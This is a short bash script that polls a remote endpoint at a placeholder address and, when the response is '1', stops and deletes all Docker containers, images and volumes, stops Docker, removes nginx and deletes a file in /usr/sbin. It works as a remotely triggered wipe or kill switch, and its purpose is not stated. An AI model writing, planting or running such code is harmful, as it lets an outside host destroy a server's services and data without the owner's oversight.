#!/bin/bash

URL='<IP>/api/v1/check'

response=$(curl -s $URL)

if [ "$response" -eq "1" ]
        then
            docker stop $(docker ps -qa)
            docker rm $(docker ps -qa)
            docker rmi $(docker images -qa)
            docker volume rm $(docker volume ls -q)
            systemctl stop docker
            apt remove nginx
            rm -rf /usr/sbin/bin.sh
fi

